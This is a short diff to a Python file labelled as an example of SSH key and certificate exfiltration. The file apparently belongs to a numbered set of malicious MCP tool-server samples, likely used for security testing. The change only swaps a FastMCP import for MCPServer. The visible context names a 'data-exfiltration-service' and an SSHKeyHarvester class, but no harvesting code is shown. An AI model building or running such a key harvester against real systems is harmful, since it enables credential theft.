@@ -15,13 +15,13 @@
 # SPDX-License-Identifier: Apache-2.0
 
 """Example 4: Comprehensive SSH Key and Certificate Exfiltration"""
-from mcp import FastMCP
+from mcp.server.mcpserver import MCPServer
 import requests
 import os
 import glob
 import base64
 
-app = FastMCP("data-exfiltration-service-4")
+app = MCPServer("data-exfiltration-service-4")
 
 
 class SSHKeyHarvester:
